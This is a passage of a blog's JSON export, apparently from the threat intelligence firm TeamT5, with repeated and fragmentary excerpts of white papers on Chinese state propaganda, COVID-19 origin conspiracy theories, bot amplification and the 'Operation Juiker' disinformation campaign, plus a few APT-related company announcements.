discussions on Weibo.\\[5\\]\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590718735/SR_1_4fb4158a6a.png)_Figure 1: News report by the China Central Television (CCTV)._\n\nAs the number confirmed cases soared in China, the Chinese state media outlets started to spread positive propaganda. For instance, they highly praised the Chinese authorities' handling of the virus by highlighting the rapid construction of Huoshenshan Hospital.\\[6\\] They also promoted narratives such as \"the Chinese people are sacrificing to fight the virus\", accompanied by praises from WHO Director General Tedros Adhanom Ghebreyesus.\\[7\\]\\[8\\]\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590718736/SR_2_0b7b7f6542.png)_Figure 2: YouTube video by China Global Television Network (CGTN)._\n\nThe regime has seized the opportunity to demonstrate the country's strength to contain the virus as well as the advantages of an authoritarian regime. The CCP uses the case to show that its authoritarian governance system is more effective than the liberal democracies when facing a crisis like the Covid-19 pandemic.\n\n### Propaganda, Hoaxes and Conspiracy Theories: From Troublemaker to Global Savior\n\nAlthough China was widely criticized for its delayed and opaque treatment to the coronavirus outbreak during the initial stage, the regime has backed on its feet to polish its international image after the pandemic seems to have subsided in China.\n\nIn particular, Italy, the first G-7 country to join China's Belt and Road Initiative (BRI), became a favorable environment for the regime to launch propaganda. We observed a series of propaganda was launched against Italy.\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590718735/SR_3_c2c0ee47d2.png)_Figure 3: The Chinese embassy posted a series of tweets to promote China's medical aids foe Italy, using hashtag #ForzaCinaeItalia_\n\nThe campaign is revealed to have boosted by social manipulation, as the hashtag #ForzaCinaeItalia (Go China, go Italy) was promoted by Twitter bot accounts.\\[9\\]\n\nIn another case, since March 15, Chinese state media outlets as well as Chinese diplomats Hua Chunying and Zhao Lijian have promoted a video of Italian chanting \"Grazie, Cina!\" on their balconies with the Chinese anthem \"March of the Volunteers\" playing.\\[10\\] The video was examined by researchers and was claimed to be manufactured.\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590718737/SR_4_b4d7e95934.png)_Figure 4: Hua Chunying's sharing the video on Twitter._\n\n### \"Origin\" Propaganda: Conspiracy Theories of Patient Zero\n\nConspiracy theories of the origin of the coronavirus have emerged across social media platforms as early as January. One of the significant cases is a conspiracy theory claiming that the US military had brought the coronavirus to Wuhan during the 2019 Military World Games.\n\nStarting from March 12, 2020, Zhao Lijian, a deputy director of the Chinese Foreign Ministry's Information Department, has posted a series of tweet to amplify the conspiracy theory on Twitter. In one of his tweets, he shared a video clip of US Centers for Disease Control (CDC) chief Robert Redfield saying some Covid-19 death might have been diagnosed as influenza in the US, using it as evidence that the virus originated in the US.\\[11\\]\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590718735/SR_5_2802d4b539.png)_Figure 5: A series of tweets by Zhao Lijian promoting the conspiracy theory, along with articles of \"globalresearch.ca\". The website often promotes anti-US conspiracy theory._\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590718735/SR_6_2bb97447e7.png)_Figure 6: Global Times reporting the conspiracy theory about US military personnel bringing COVID-19 to China._\n\nBesides the US, Italy is also one of the scapegoats for China's coronavirus origin propaganda. Starting from March 22, multiple Chinese state media outlets have published news article titled \"Coronavirus may have existed in Italy since November: local researcher,\" implying that Italy was the origin of Coronavirus.\\[12\\]\\[13\\] They cited the words of the Italian physician Giuseppe Remuzzi in an interview with NPR on March 19 \\[14\\], using it as statement to prove that China is not the origin of the coronavirus.\n\nAlthough Remuzzi protested that his words were twisted by China, the narrative has already gone viral.\\[15\\] The CCTV created a topic \"Expert claims the coronavirus may have existed in Italy since November\" (专家称疫情去年11月或已在意大利流行), which reached approximately 500 million views and 35,000 discussion posts.\n\n### Conclusion\n\nChina's cyber strength and digital influence did not scale down even in the times of the pandemic. Instead, the regime took the opportunity to pose itself as a global leader more capable than the US. We can see that the CCP has well mastered its cyber capabilities and propaganda machine, expanding the regime's control from physical entities to public opinion. Moreover, the CCP has elevated its efforts to shape international opinion through the Twitter platform. We assess that the CCP will have more power of discourse and influence after they learned to conduct propaganda campaign on foreign social media platforms, and every party should be vigilant about it.\n\n### Reference\n\n\\[1\\] 工业和信息化部办公厅关于做好疫情防控期间信息通信行业网络安全保障工作的通知 (MIIT's Notice on Cybersecurity Practice for Information and Communications Technology (ICT) Service Providers During Epidemic Control)  \nhttp://www.miit.gov.cn/n1146290/n1146402/c7681785/content.html\n\n\\[2\\] 工业和信息化部召开媒体通气会 介绍电信大数据分析、支撑服务疫情防控总体情况 (MIIT's Media Briefing on the Utilization of Telecom Big Data Analysis on Epidemic Control)  \nhttp://www.miit.gov.cn/n1146290/n1146402/c7678438/content.html\n\n\\[3\\] 健康码的隐私政策还有哪些改进空间？(Room of Improvement on the Health Code System's Privacy Policy)  \nhttps://www.jiemian.com/article/4120372.html\n\n\\[4\\] 美国暴发40年来最致命流感 已有6600人死亡 (US' Worst Influenza Outbreak in 40 Years, 6600 Americans Killed)  \nhttp://news.sina.com.cn/w/2020-01-22/doc-iihnzhha4088647.shtml\n\n\\[5\\] https://s.weibo.com/weibo?q=%23美国爆发乙型流感%23\u0026Refer=SWeibo_box\n\n\\[6\\] CGTN: Time lapse video: Construction of Wuhan Huoshenshan Hospital completed  \nhttps://www.youtube.com/watch?v=53nhErXUd9A\n\n\\[7\\] 中国人民\"正在为全人类作贡献\" (Chinese People are Contributing for All Human Kind)  \nhttp://world.people.com.cn/n1/2020/0308/c1002-31622166.html\n\n\\[8\\] Xinhua Net: China deserves appreciation for efforts, sacrifices in fighting epidemic: WHO chief  \nhttp://www.xinhuanet.com/english/2020-02/16/c_138789289.htm\n\n\\[9\\] How China unleashed Twitter bots to spread COVID-19 propaganda in Italy  \nhttps://formiche.net/2020/03/china-unleashed-twitter-bots-covid19-propaganda-italy/\n\n\\[10\\] https://twitter.com/SpokespersonCHN/status/1239041044580188162  \nhttps://twitter.com/zlj517/status/1239112822908276736  \nCGTN: Italians play Chinese national anthem to thank China for its aid  \nhttps://www.youtube.com/watch?v=8ZKsA2jbwlk  \nCCTV: Italians play Chinese national anthem, chanting \"Grazie Cina\"  \nhttps://www.facebook.com/watch/?v=201784281098386\n\n\\[11\\] https://twitter.com/zlj517/status/1238111898828066823\n\n\\[12\\] Coronavirus may have existed in Italy since November: local researcher  \nhttps://news.cgtn.com/news/2020-03-22/Coronavirus-may-have-existed-in-Italy-since-November-local-researcher-P4i2As2OAg/index.html\n\n\\[13\\] Italian doctors saw strange pneumonia cases before China's COVID-19 outbreak, report says   \nhttp://www.china.org.cn/world/Off_the_Wire/2020-03/22/content_75845579.htm\n\n\\[14\\] 'Every Single Individual Must Stay Home': Italy's Coronavirus Surge Strains Hospitals  \nhttps://www.npr.org/2020/03/19/817974987/every-single-individual-must-stay-home-italy-s-coronavirus-deaths-pass-china-s?t=1585131614833\n\n\\[15\\] Beijing twisted my words on coronavirus's Italian origin, says scientist Giuseppe Remuzzi  \nhttps://www.thetimes.co.uk/article/beijing-twisted-my-words-on-coronaviruss-italian-origin-says-scientist-giuseppe-remuzzi-6twwhkrvn","createdAt":"2020-05-24T17:56:37.931Z","updatedAt":"2020-07-02T09:41:31.546Z","__v":0,"id":"5ecab555602fc90040476054"}],"createdAt":"2020-05-24T17:56:37.926Z","updatedAt":"2021-01-08T06:55:16.343Z","__v":1,"topic":"5ecaa02ba792d70040a0d8b3","author":"5eeae9e3163518003f86d917","publish_date":"2020-04-21T02:00:00.000Z","id":"5ecab555602fc90040476053"},{"publish":true,"enable_form":true,"tags":["5f0e5b52163518003f86d983","5f0e6732163518003f86d9aa","5f0e6743163518003f86d9ab","5ecf6ceefedd7f004b26974a","5f0e6315163518003f86d9a9"],"relative_posts":["5ecab44c602fc90040476047","602e177fc56e80003f985a0e","5f866d3ada3440005757a928"],"_id":"5f0e5aad163518003f86d97e","post_url":"teamt5-information-operation-white-paper-china-s-digital-propaganda-formula-inside-the-great-firewall","post_name":"TeamT5 Information Operation White Paper (Part 2 of 3): China’s Digital Propaganda Formula inside the Great Firewall","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/v1594807939/1920_1280_1920-1280_%E8%A4%87%E6%9C%AC_3_4730f822ca.jpg","contents":[{"locale":"en","_id":"5f0e5aae163518003f86d97f","title":"TeamT5 Information Operation White Paper (Part 2 of 3): China’s Digital Propaganda Formula inside the Great Firewall","context":"To confront the emerging threat of China's Information Operation, TeamT5 threat intelligence team publishes this White Paper covering how China conduct information manipulation across Chinese social media platforms. From the 2019 Hong Kong Protest to the 2020 COVID-19 pandemic, China has demonstrated the art of surveillance, censorship, and most importantly, digital propaganda.\n\nIn this white paper, we focus on China's digital propaganda inside the Great Firewall. We suggest that the regime has developed a unique, organizational, and sophisticated propaganda mechanism, which we dub as \"digital propaganda formula.\" With this formula, the Chinese Communist Party (CCP) has managed to transform all the Chinese social media platforms inside the Great Firewall into an almost total pro-CCP environment.\n\n#### Key Takeaways\n\n1. CCP has strengthened its control over Chinese cyberspace by establishing legislations as well as centralizing administrations, and the \"last mile\" of its cyber governance is to control public opinion through censorship and digital propaganda.\n\n2. We dub China's sophisticated propaganda mechanism the \"digital propaganda formula,\" which consists of state media, communist youth league, governmental affairs new media, as well as trolling factory.\n\n3. Moreover, CCP's policies have bolstered the industry of \"public opinion guidance\" in China. The industry practitioners have developed AI and big data-powered systems to help the government to collect, store, and analyze public sentiment.\n\n4. China's formula has polluted the online information environment inside the Great Firewall. We assess that the CCP is trying to project its digital propaganda dominance to foreign social media platforms in order to control the world's discourse power. \n\nFollowing the global pandemic, the world relies on the internet more than ever.

They shoulder the task to polish the image of the regime and propagate the narrative of the Chinese Communist Party (CCP). It is noteworthy that their official accounts have obtained an unexpected number of followers in recent years. For instance, four Chinese state media are included in the top 20 most-followed pages on Facebook. Their main audience, apart from the Chinese citizens, are overseas Chinese diaspora, which many of them have rights to vote in countries such as the U.S., Canada, and Australia, thus having the ability to influence a country's politics.\n\u003cbr\u003e\n\u003cbr\u003e\n2.

This year, the takedowns of covert Chinese social media accounts by Facebook, Twitter, and Google are more frequent than ever. However, even with such efforts, we observed that there are new covert actors emerging across the platforms, while the banned actors keep coming back to the scene by registering new domains and new accounts. We spotted that there is a huge number of Facebook pages with admins located in China dedicated to disseminating Chinese propaganda content originated from Chinese social media platform, Weibo. Besides, there are sophisticated actors that create websites and subtle content to help the Chinese government shaping the narrative for the Hong Kong protest. We also detected numerous networks of pro-China political accounts that demonstrated strong signs of automated behavior.\n\u003cbr\u003e\n \u003cbr\u003e\n3.

APT actors, typically a state-sponsored group, usually conduct prolonged and targeted cyberattacks to mine highly sensitive data. However, in mid-2020, we identified an InfoOp that can be linked to a notorious Chinese APT group which TeamT5 intelligence team has tracked for years. We discovered that the threat actors had disseminated disinformation about \"Juiker,\" a messaging app developed by Taiwan's research institute and widely used by government units, on Taiwan's largest forum PTT. The operation, which we dub as \"Operation Juiker,\" aimed to discredit Taiwan's intelligence agency and government-backed research institute by spreading disinformation of the messaging app being hacked.\n\u003cbr\u003e\n\u003cbr\u003e\n4.  It is more crucial than ever to adopt threat intelligence solutions to combat the issue.\n\u003cbr\u003e\n\u003cbr\u003e\nThe abovementioned Operation Juiker has well demonstrated the possibility of \"APT + InfoOp\" attack model, which involves targeted social media campaigns disseminating disinformation based on highly confidential data. Such situation is super tricky, and it could pose a great threat to democratic countries. In this case, threat intelligence can help provide instant analysis of actor methodologies, suspicious indicators, and potential risks. We suggest that it is crucial for government units, critical infrastructure operators, and major business vendors to apply threat intelligence to combat this issue.\n\u003cbr\u003e\n\u003cbr\u003e\n\nIf you are interested in this white paper, please fill out the form below and get the full-text PDF.\n\u003cbr\u003e\n\u003cbr\u003e\nAnd don't miss our blog updates!

APT 攻擊者很可能參與了社群媒體上的資訊戰\n\u003cbr\u003e\n\u003cbr\u003e\n我們擔心 APT 攻擊者很可能參與了社群媒體上的資訊戰。APT 通常是由一個國家所支持的駭客團體，以竊取機敏資料為主，APT 的攻擊者往往具備了強悍的網路攻擊手法與資源。然而，我們今年偵察到了一個可能是由 APT 攻擊者發動的假新聞攻擊。該事件發生在 2020 年七月，PTT 論壇八卦版上，開始有許多被盜用的帳號以假新聞攻擊台灣重要軍事單位，造謠台灣公務機關使用的 Juiker 通訊軟體遭駭，以及台灣重要軍事機關遭駭。我們透過搜索比對貼文與發文 IP，發現其中一個 IP 位址，符合某個中國 APT 曾經使用過的中繼站。\n\u003cbr\u003e\n\u003cbr\u003e\n4. 威脅情資作為對抗資訊戰的重要環節\n\u003cbr\u003e\n\u003cbr\u003e\n如同前述的分析脈絡，APT 與社群操弄的結合會讓防守方更加棘手。在棘手的防守環境中，唯有威脅情資（threat intelligence）可以提供即時的分析，評估攻擊者的攻擊手法、可疑的指標、以及造成的風險。而在快速更迭的社群媒體環境中，平台方與事實查核團體非常難找到證據，歸因大量散播的假新聞。我們認為唯有導入威脅情資，才能有效幫助政府單位、重要關鍵基礎設施與企業，對抗資訊戰。\n\u003cbr\u003e\n\u003cbr\u003e\n\n若您對我們的白皮書有興趣，請填寫以下表單，取得完整的研究報告。\n\u003cbr\u003e\n\u003cbr\u003e\n追蹤 TeamT5 [Twitter](https://twitter.com/TeamT5_Official)，資安動態不漏接！\n\u003cbr\u003e","createdAt":"2020-10-14T07:24:40.028Z","updatedAt":"2020-12-04T03:23:18.109Z","__v":0,"id":"5f86a7b8da3440005757a941"}],"createdAt":"2020-10-14T03:15:06.772Z","updatedAt":"2021-06-02T05:41:47.633Z","__v":1,"author":"5eeae9e3163518003f86d917","topic":"5ecaa02ba792d70040a0d8b3","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1602486856/2020%E7%99%BD%E7%9A%AE%E6%9B%B8V3%E5%AE%A3%E5%82%B3%E5%9C%96_blog_1920x1280_26f322ea32.jpg","attachment_id":"1IiFL4iEBKoOwQkSbmwVsQMXWOLV4r9pN","id":"5f866d3ada3440005757a928"},{"publish":true,"enable_form":false,"tags":["5ecf6ceefedd7f004b26974a","5f0e6732163518003f86d9aa","5f86a8b7da3440005757a946"],"relative_posts":["5ecab44c602fc90040476047","5f0e5aad163518003f86d97e","5f866d3ada3440005757a928"],"_id":"602e177fc56e80003f985a0e","post_url":"korea-etnews-china-information-warfare-mobilizing-public-opinion-manipulation-and-apt-group","post_name":"【Korea ETNews】China, Information Warfare...

It has been confirmed that even the Chinese government-supported Advanced Persistent Threat (APT) hacking organization has been mobilized to manipulate public opinion such as disseminating fake news. APT organizations have gone beyond intelligence warfare. This is the first time that it has been confirmed that they have participated in public opinion.\n\nAccording to a report released by Taiwanese threat intelligence company TeamT5 at the recent SANS Summit, false accounts opened on social network service (SNS) platforms such as Facebook, Google (YouTube), and Twitter have been investigated at an all-time high.\n\nTeamT5 made this statement based on the number of closed accounts published on each SNS platform. Google said it had removed 186 YouTube channels that are estimated to be involved in the Chinese information war in the second quarter of last year.\n\nThe Chinese government is known to hold a pro-Chinese content and dissemination of false facts, which are known to be engaged in a defensive public opinion battle that includes state-run media and spam botnets while creating false accounts to create favorable public opinion. The number of Facebook pages used by The New York Times, CNN, and BBC pages exceeded the number of followers two years ago. As of April 2019, the number of followers on CGTN's Facebook page, the Chinese state media, was 75 million, while The New York Times, CNN, and BBC had 50 million each. \n\nIt wasn't even crazy. Targeting Taiwan, which the Chinese government observes, the APT hacking organization used \"Juiker\" to spread false information, which is a popular SNS platform used in Taiwan like KakaoTalk.\n\nTeamT5 said, \"The APT Group is an organization that focuses on espionage and information stealing, and the fact that they are mobilized in information warfare means that the Chinese government is putting all efforts into information warfare,\" and \"It is urgent,\" TeamT5 CTI analyst Che Chang warned.\n\nThe Chinese government turned out to build a system tool that monitors public opinion using Big Data and Artificial Intelligence (AI) technology, a system that can monitor not only domestic social media but also sensitive websites distributed abroad.\n\nTeamT5 is a security company founded by APT experts. It tracks and monitors versions between the Chinese government and supplies threat intelligence to Asia-Pacific regions such as Taiwan and Japan.\n\n[Read more](https://www.etnews.com/20210215000176)\n\n\u003cbr\u003e\n","__v":0,"id":"602e1c9fc56e80003f985a11"}],"createdAt":"2021-02-18T07:30:07.989Z","updatedAt":"2021-06-02T05:41:47.631Z","__v":0,"publish_date":"2021-02-15T04:00:00.000Z","author":"5eec3483163518003f86d943","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1613634738/SANS_1_a4937cc174.png","topic":"5ecaa036a792d70040a0d8b4","id":"602e177fc56e80003f985a0e"}],"id":"5ecf6ceefedd7f004b26974a"},{"_id":"5f86733cda3440005757a93f","name":"state-media","createdAt":"2020-10-14T03:40:44.189Z","updatedAt":"2020-10-14T03:40:44.189Z","__v":0,"posts":[{"publish":true,"enable_form":true,"tags":["5ecf6ceefedd7f004b26974a","5f86733cda3440005757a93f","5f0e6315163518003f86d9a9","5ecf890dfedd7f004b26978e","5f867386da3440005757a940","5eec1435163518003f86d92e","5f86a8b7da3440005757a946"],"relative_posts":["5ecab44c602fc90040476047","5f0e5aad163518003f86d97e","602e177fc56e80003f985a0e"],"_id":"5f866d3ada3440005757a928","post_name":"InfoOp White Paper III: China’s Social Manipulation outside the Great Firewall","post_url":"info-op-white-paper-iii-china-s-social-manipulation-outside-the-great-firewall","publish_date":"2020-10-15T02:30:00.000Z","contents":[{"locale":"en","_id":"5f866d3ada3440005757a929","title":"InfoOp White Paper III: China’s Social Manipulation outside the Great Firewall","context":"In the final part of our Information Operation White Paper, we will demonstrate China's Information Operations (InfoOps) targeting the global audience.

APT 攻擊者很可能參與了社群媒體上的資訊戰\n\u003cbr\u003e\n\u003cbr\u003e\n我們擔心 APT 攻擊者很可能參與了社群媒體上的資訊戰。APT 通常是由一個國家所支持的駭客團體，以竊取機敏資料為主，APT 的攻擊者往往具備了強悍的網路攻擊手法與資源。然而，我們今年偵察到了一個可能是由 APT 攻擊者發動的假新聞攻擊。該事件發生在 2020 年七月，PTT 論壇八卦版上，開始有許多被盜用的帳號以假新聞攻擊台灣重要軍事單位，造謠台灣公務機關使用的 Juiker 通訊軟體遭駭，以及台灣重要軍事機關遭駭。我們透過搜索比對貼文與發文 IP，發現其中一個 IP 位址，符合某個中國 APT 曾經使用過的中繼站。\n\u003cbr\u003e\n\u003cbr\u003e\n4. 威脅情資作為對抗資訊戰的重要環節\n\u003cbr\u003e\n\u003cbr\u003e\n如同前述的分析脈絡，APT 與社群操弄的結合會讓防守方更加棘手。在棘手的防守環境中，唯有威脅情資（threat intelligence）可以提供即時的分析，評估攻擊者的攻擊手法、可疑的指標、以及造成的風險。而在快速更迭的社群媒體環境中，平台方與事實查核團體非常難找到證據，歸因大量散播的假新聞。我們認為唯有導入威脅情資，才能有效幫助政府單位、重要關鍵基礎設施與企業，對抗資訊戰。\n\u003cbr\u003e\n\u003cbr\u003e\n\n若您對我們的白皮書有興趣，請填寫以下表單，取得完整的研究報告。\n\u003cbr\u003e\n\u003cbr\u003e\n追蹤 TeamT5 [Twitter](https://twitter.com/TeamT5_Official)，資安動態不漏接！\n\u003cbr\u003e","createdAt":"2020-10-14T07:24:40.028Z","updatedAt":"2020-12-04T03:23:18.109Z","__v":0,"id":"5f86a7b8da3440005757a941"}],"createdAt":"2020-10-14T03:15:06.772Z","updatedAt":"2021-06-02T05:41:47.633Z","__v":1,"author":"5eeae9e3163518003f86d917","topic":"5ecaa02ba792d70040a0d8b3","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1602486856/2020%E7%99%BD%E7%9A%AE%E6%9B%B8V3%E5%AE%A3%E5%82%B3%E5%9C%96_blog_1920x1280_26f322ea32.jpg","attachment_id":"1IiFL4iEBKoOwQkSbmwVsQMXWOLV4r9pN","id":"5f866d3ada3440005757a928"}],"id":"5f86733cda3440005757a93f"},{"_id":"5f0e6315163518003f86d9a9","name":"social media","createdAt":"2020-07-15T01:59:49.787Z","updatedAt":"2020-10-14T03:40:54.601Z","__v":0,"posts":[{"publish":true,"enable_form":true,"tags":["5f0e5b52163518003f86d983","5f0e6732163518003f86d9aa","5f0e6743163518003f86d9ab","5ecf6ceefedd7f004b26974a","5f0e6315163518003f86d9a9"],"relative_posts":["5ecab44c602fc90040476047","602e177fc56e80003f985a0e","5f866d3ada3440005757a928"],"_id":"5f0e5aad163518003f86d97e","post_url":"teamt5-information-operation-white-paper-china-s-digital-propaganda-formula-inside-the-great-firewall","post_name":"TeamT5 Information Operation White Paper (Part 2 of 3): China’s Digital Propaganda Formula inside the Great Firewall","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/v1594807939/1920_1280_1920-1280_%E8%A4%87%E6%9C%AC_3_4730f822ca.jpg","contents":[{"locale":"en","_id":"5f0e5aae163518003f86d97f","title":"TeamT5 Information Operation White Paper (Part 2 of 3): China’s Digital Propaganda Formula inside the Great Firewall","context":"To confront the emerging threat of China's Information Operation, TeamT5 threat intelligence team publishes this White Paper covering how China conduct information manipulation across Chinese social media platforms. From the 2019 Hong Kong Protest to the 2020 COVID-19 pandemic, China has demonstrated the art of surveillance, censorship, and most importantly, digital propaganda.\n\nIn this white paper, we focus on China's digital propaganda inside the Great Firewall. We suggest that the regime has developed a unique, organizational, and sophisticated propaganda mechanism, which we dub as \"digital propaganda formula.\" With this formula, the Chinese Communist Party (CCP) has managed to transform all the Chinese social media platforms inside the Great Firewall into an almost total pro-CCP environment.\n\n#### Key Takeaways\n\n1. CCP has strengthened its control over Chinese cyberspace by establishing legislations as well as centralizing administrations, and the \"last mile\" of its cyber governance is to control public opinion through censorship and digital propaganda.\n\n2. We dub China's sophisticated propaganda mechanism the \"digital propaganda formula,\" which consists of state media, communist youth league, governmental affairs new media, as well as trolling factory.\n\n3. Moreover, CCP's policies have bolstered the industry of \"public opinion guidance\" in China. The industry practitioners have developed AI and big data-powered systems to help the government to collect, store, and analyze public sentiment.\n\n4. China's formula has polluted the online information environment inside the Great Firewall. We assess that the CCP is trying to project its digital propaganda dominance to foreign social media platforms in order to control the world's discourse power. \n\nFollowing the global pandemic, the world relies on the internet more than ever. Cyber threat actors and influence operators, either state-backed or money driven, are taking the advantage to conduct information operation.

The first part of the report displays a brief overview of its overt operations which are carried out by state media, embassies, and diplomats. Then we look into the covert operations, which can be observed in pro-China fan pages, content farms, and spam botnet. Last but not least, we provide the case study of \"Operation Juiker\" on Taiwan's largest forum PTT, which suggests the possibility of the APT (Advanced Persistent Threat) actors entering the threat landscape.\n\n#### Key Takeaways\n\n1.

They shoulder the task to polish the image of the regime and propagate the narrative of the Chinese Communist Party (CCP). It is noteworthy that their official accounts have obtained an unexpected number of followers in recent years. For instance, four Chinese state media are included in the top 20 most-followed pages on Facebook. Their main audience, apart from the Chinese citizens, are overseas Chinese diaspora, which many of them have rights to vote in countries such as the U.S., Canada, and Australia, thus having the ability to influence a country's politics.\n\u003cbr\u003e\n\u003cbr\u003e\n2.

This year, the takedowns of covert Chinese social media accounts by Facebook, Twitter, and Google are more frequent than ever. However, even with such efforts, we observed that there are new covert actors emerging across the platforms, while the banned actors keep coming back to the scene by registering new domains and new accounts. We spotted that there is a huge number of Facebook pages with admins located in China dedicated to disseminating Chinese propaganda content originated from Chinese social media platform, Weibo. Besides, there are sophisticated actors that create websites and subtle content to help the Chinese government shaping the narrative for the Hong Kong protest. We also detected numerous networks of pro-China political accounts that demonstrated strong signs of automated behavior.\n\u003cbr\u003e\n \u003cbr\u003e\n3.

APT actors, typically a state-sponsored group, usually conduct prolonged and targeted cyberattacks to mine highly sensitive data. However, in mid-2020, we identified an InfoOp that can be linked to a notorious Chinese APT group which TeamT5 intelligence team has tracked for years. We discovered that the threat actors had disseminated disinformation about \"Juiker,\" a messaging app developed by Taiwan's research institute and widely used by government units, on Taiwan's largest forum PTT.

APT 攻擊者很可能參與了社群媒體上的資訊戰\n\u003cbr\u003e\n\u003cbr\u003e\n我們擔心 APT 攻擊者很可能參與了社群媒體上的資訊戰。APT 通常是由一個國家所支持的駭客團體，以竊取機敏資料為主，APT 的攻擊者往往具備了強悍的網路攻擊手法與資源。然而，我們今年偵察到了一個可能是由 APT 攻擊者發動的假新聞攻擊。該事件發生在 2020 年七月，PTT 論壇八卦版上，開始有許多被盜用的帳號以假新聞攻擊台灣重要軍事單位，造謠台灣公務機關使用的 Juiker 通訊軟體遭駭，以及台灣重要軍事機關遭駭。我們透過搜索比對貼文與發文 IP，發現其中一個 IP 位址，符合某個中國 APT 曾經使用過的中繼站。\n\u003cbr\u003e\n\u003cbr\u003e\n4. 威脅情資作為對抗資訊戰的重要環節\n\u003cbr\u003e\n\u003cbr\u003e\n如同前述的分析脈絡，APT 與社群操弄的結合會讓防守方更加棘手。在棘手的防守環境中，唯有威脅情資（threat intelligence）可以提供即時的分析，評估攻擊者的攻擊手法、可疑的指標、以及造成的風險。而在快速更迭的社群媒體環境中，平台方與事實查核團體非常難找到證據，歸因大量散播的假新聞。我們認為唯有導入威脅情資，才能有效幫助政府單位、重要關鍵基礎設施與企業，對抗資訊戰。\n\u003cbr\u003e\n\u003cbr\u003e\n\n若您對我們的白皮書有興趣，請填寫以下表單，取得完整的研究報告。\n\u003cbr\u003e\n\u003cbr\u003e\n追蹤 TeamT5 [Twitter](https://twitter.com/TeamT5_Official)，資安動態不漏接！\n\u003cbr\u003e","createdAt":"2020-10-14T07:24:40.028Z","updatedAt":"2020-12-04T03:23:18.109Z","__v":0,"id":"5f86a7b8da3440005757a941"}],"createdAt":"2020-10-14T03:15:06.772Z","updatedAt":"2021-06-02T05:41:47.633Z","__v":1,"author":"5eeae9e3163518003f86d917","topic":"5ecaa02ba792d70040a0d8b3","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1602486856/2020%E7%99%BD%E7%9A%AE%E6%9B%B8V3%E5%AE%A3%E5%82%B3%E5%9C%96_blog_1920x1280_26f322ea32.jpg","attachment_id":"1IiFL4iEBKoOwQkSbmwVsQMXWOLV4r9pN","id":"5f866d3ada3440005757a928"}],"id":"5f0e6315163518003f86d9a9"},{"_id":"5ecf890dfedd7f004b26978e","name":"APT","createdAt":"2020-05-28T09:49:01.076Z","updatedAt":"2020-10-14T03:41:17.235Z","__v":0,"posts":[{"publish":true,"enable_form":false,"tags":["5eec17e7163518003f86d931","5eec183c163518003f86d933","5eec125f163518003f86d920","5eec12cf163518003f86d923","5ecf890dfedd7f004b26978e","5ecf8852fedd7f004b269789"],"relative_posts":["5ecf7b2afedd7f004b269777"],"_id":"5ecab5be602fc90040476057","post_url":"teamt5-collaborates-with-macnica-networks-and-terilogy-technology-to-help-critical-infrastructure-combat-apt-attacks","post_name":"TeamT5 聯手 Macnica Networks 與 Terilogy Technology，幫助「關鍵基礎設施」對抗 APT 攻擊","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/v1590343084/20200505_cover_d628be4c18.jpg","contents":[{"locale":"tw","_id":"5ecab5be602fc90040476058","title":"TeamT5 聯手 Macnica Networks 與 Terilogy Technology，幫助「關鍵基礎設施」對抗 APT 攻擊","context":"TeamT5 攜手日商 Macnica Networks 與 Terilogy Technology 合作提供「企業 APT 攻擊防疫計畫」，協助日本境內關鍵基礎設施（Critical Infrastructure）的相關企業在新冠肺炎疫情期間對抗 APT 攻擊（Advanced Persistent Threat）。\n\n「企業 APT 攻擊防疫計畫」將使用 ThreatSonar 掃描與診斷 14 個關鍵基礎設施產業，包括：政府、軍事國防、情報通信、金融、航空、鐵路、電力、水利、醫療、物流、化學、石油瓦斯及半導體等。我們的威脅診斷工具 ThreatSonar 可協助企業防範資安事件於未然，及早偵測潛藏的 APT 風險。\n\n同時因應台灣各大企業，尤其是關鍵基礎設施營運單位，在疫情時期大幅上升的資安危機，TeamT5 同時推出「遠端辦公防疫計畫」（WFH Cloud Program）來替各大企業診斷與辨認一般防毒軟體無法有效守備的 APT 攻擊。\n\n關於日本境內的「企業 APT 攻擊防疫計畫」申請方式與服務內容，請洽詢當地代理商來了解更多申請資訊與適用辦法。至於台灣的「遠端辦公防疫計畫」，請洽台灣業務。","createdAt":"2020-05-24T17:58:22.019Z","updatedAt":"2020-07-02T08:49:41.640Z","__v":0,"id":"5ecab5be602fc90040476058"}],"createdAt":"2020-05-24T17:58:22.015Z","updatedAt":"2020-12-16T01:47:55.087Z","__v":1,"topic":"5ecaa036a792d70040a0d8b4","author":"5eec3483163518003f86d943","publish_date":"2020-05-05T02:30:00.000Z","id":"5ecab5be602fc90040476057"},{"publish":true,"enable_form":false,"tags":["5eec17e7163518003f86d931","5eec125f163518003f86d920","5eec1270163518003f86d921","5ecf890dfedd7f004b26978e"],"relative_posts":["5ecab5be602fc90040476057"],"_id":"5ecf7b2afedd7f004b269777","post_url":"teamt5-and-macnica-networks-release-joint-project-on-2019-s-apt-attacks-in-japan","post_name":"TeamT5 and Macnica Networks Release Joint Project on 2019's APT Attacks in Japan","contents":[{"locale":"en","_id":"5ecf7b2afedd7f004b269778","context":"TeamT5 and Macnica Networks have published our joint research on APT attacks targeting Japan over the past year.

